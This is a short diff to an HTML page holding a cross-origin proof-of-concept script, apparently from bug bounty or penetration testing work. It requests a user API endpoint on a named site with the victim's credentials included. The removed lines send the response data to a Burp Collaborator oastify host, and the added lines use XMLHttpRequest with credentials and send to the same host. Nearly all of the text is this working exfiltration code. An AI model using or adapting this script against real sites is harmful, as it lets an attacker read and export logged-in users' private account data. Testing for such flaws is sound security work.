@@ -2,17 +2,19 @@
 <html>
 <head>
     <script>
-        fetch('https://quitplan.ycq2.org/api/user', {
-            method: 'GET',
-            credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Send the response data to your Burp Collaborator server
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET', 'https://quitplan.ycq2.org/api/user', true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            console.log("Response received:", this.responseText);
+
+            // Send null payload to Burp Collaborator server
             var img = new Image();
-            img.src = 'https://dr8gpzq0tx3iayklyxuapotqwh28qzhn6.oastify.com/?data=' + encodeURIComponent(data);
-        })
-        .catch(error => console.error('Error:', error));
+            img.src = 'https://dr8gpzq0tx3iayklyxuapotqwh28qzhn6.oastify.com/?data=' + encodeURIComponent('null');
+        }
     </script>
 </head>
 <body>
